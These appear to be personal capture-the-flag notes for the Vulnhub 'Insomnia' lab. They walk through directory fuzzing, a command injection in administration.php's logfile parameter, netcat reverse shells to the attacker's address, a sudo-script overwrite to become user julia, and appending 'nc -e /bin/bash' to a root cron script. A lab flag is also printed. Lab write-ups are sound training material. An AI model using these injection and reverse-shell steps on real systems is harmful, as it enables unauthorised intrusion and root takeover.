
---


Vulnhub URL: https://www.vulnhub.com/entry/insomnia-1,644/

\[OS]: 
\[Web-Technology]: PHP cli server 5.5 or later (PHP 7.3.19-1)
\[Hostname]:  Insomnia
\[IP]:  192.168.56.116
\[USERS]:   
\[CREDENTIALS]:  

---
\[To-Try LIST]:  
8080 -> Web Enum



---
\[NMAP RESULTS]:  

PORT     STATE SERVICE VERSION
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1)
|_http-title: Chat

--- 

\[Web Services Enumeration]:   
Login - choose name - default name is guest
Source doesnt have anything, no robots

Can input text - possible injection

Gobuster, Fuzzing

```bash
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 30 

Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.56.116:8080/42a790b2-d37a-4d5e-923b-40b4c1d138c3 => 200 (Length: 2899). To continue please exclude the status code or the length

# try with exclusions
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 30 --exclude-length 2899

/administration.php
/process.php
```

![[Pasted image 20251101063623.png]]
Empty input implies room for fuzzing
```bash
ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://192.168.56.116:8080/administration.php?FUZZ=helloworld 

#Resulted in a lot of size 65 - try exclude these
ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://192.168.56.116:8080/administration.php?FUZZ=helloworld -fs 65 


#Found param logfile

```

![[Pasted image 20251101064328.png]]
```bash


```

![[Pasted image 20251101064446.png]]
```bash

Now we can try chain commands

http://192.168.56.116:8080/administration.php?logfile=hi; whoami
```
![[Pasted image 20251101064528.png]]
```bash
#Ok we have a command injection vuln
nc -nlvp 5555
#pentest monkey rev shell - nc executes bash 
/administration.php?logfile=hi;nc 192.168.56.101 5555

#Connected on nc
```


---


\[OTHER / PRIVILEGE-ESCALATION]:   


```bash

# now we have revshell as www-data - step one get tty and setup (S1ren)
ls /home #julia
cat /home/julia/user.txt 

~~~~~~~~~~~~~\
USER INSOMNIA
~~~~~~~~~~~~~
Flag : [c2e285cb33cecdbeb83d2189e983a8c0]

sudo -l
User www-data may run the following commands on insomnia:
    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh

# Can run /bin/bash with the argument /var/www/html/start.sh - single command with fixed argument - as julia

# Means I can run sudo -u julia /bin/bash /var/www/html/start.sh without a password



ls -l /var/www/html/start.sh

# Writable and executable 
# whatever command i want to run as julia i can put in here
www-data@insomnia:/home$ echo '/bin/bash' > /var/www/html/start.sh
#now i have opened a shell as julia
sudo -u julia /bin/bash /var/www/html/start.sh 


# More julia privesc - S1ren - can also use linpeas

ls /var/cron
ls -l /var/cron/check.sh #rot cron - world writable

# See cron config in /etc/crontab
cat /etc/crontab 

# check.sh set to run 0-50 mins. If we modify we can get root access
# It runs as root and we can modify so we can make it nc back to us\

# On Kali : nc -nlvp 7777

echo 'nc -e /bin/bash 192.168.56.101 7777' >> /var/cron/check.sh
```
![[Pasted image 20251101072049.png]]

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
